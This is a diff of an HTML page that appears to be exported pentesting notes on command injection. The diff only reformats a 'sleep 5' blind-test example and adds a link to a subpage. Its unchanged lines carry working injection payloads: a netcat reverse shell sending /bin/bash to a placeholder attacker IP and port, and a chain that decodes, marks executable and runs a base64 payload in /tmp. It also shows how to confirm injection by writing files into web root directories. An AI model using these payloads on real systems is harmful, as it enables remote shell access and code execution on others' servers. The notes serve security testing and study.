@@ -112,15 +112,13 @@ vuln=127.0.0.1%0anohup nc -e /bin/bash &lt;attacker-ip&gt; &lt;attacker-port&gt;
 vuln=echo PAYLOAD &gt; /tmp/payload.txt; cat /tmp/payload.txt | base64 -d &gt; /tmp/payload; chmod 744 /tmp/payload; /tmp/payload
 --------------------------------------------------------------------</code></pre><p id="2bb56507-c2a6-49a3-b8c1-57d1e2c890aa" class="">
 </p><p id="012b0640-f696-4582-89ae-a59938f54623" class=""><strong>OS Command Injections:</strong></p><p id="858ca5f2-718c-4a6b-ba06-5fe734d0a245" class="">
-</p><p id="22022ace-b913-4652-92be-7144c490d943" class="">Blind:</p><p id="a737f6cf-07b5-453a-874e-cddafff5d45b" class="">Send sleep commands to test</p><p id="7e10d706-605d-4c64-bfee-1a00b1d519f4" class="">
-</p><p id="79270270-5adf-4153-aca5-8bf8e96726bb" class="">
-</p><p id="7763900a-afc4-4c90-9e41-3e03ce558639" class="">sleep 5</p><p id="1b03022a-af39-4f40-9438-74f281f16204" class=""><strong>We can test for cmd injection using web server root directories:</strong></p><pre id="18308b41-3c4f-45b8-8a58-13e3b86364e4" class="code"><code>touch test.txt &lt;location&gt;
+</p><p id="22022ace-b913-4652-92be-7144c490d943" class="">Blind:</p><p id="a737f6cf-07b5-453a-874e-cddafff5d45b" class="">Send sleep commands to test</p><pre id="7763900a-afc4-4c90-9e41-3e03ce558639" class="code"><code>sleep 5</code></pre><p id="1b03022a-af39-4f40-9438-74f281f16204" class=""><strong>We can test for cmd injection using web server root directories:</strong></p><pre id="18308b41-3c4f-45b8-8a58-13e3b86364e4" class="code"><code>touch test.txt &lt;location&gt;
 
 /var/www/
 /var/www/html/
 /var/www/public/
 /var/www/static/</code></pre><p id="1604092a-6529-45ae-8939-24a3311a3dbc" class="">
-</p></div></article></main></main>
+</p><figure id="505bab18-e96d-4c14-b139-08c38caf0bff" class="link-to-page"><a href="Command%20Injection%207fcb8bbaff6641fea477c37f4edbaefd/Command%20Injection%20505bab18e96d4c14b13908c38caf0bff.html">Command Injection</a></figure></div></article></main></main>
 
     <!--==================== FOOTER ====================-->
     <footer class="footer">
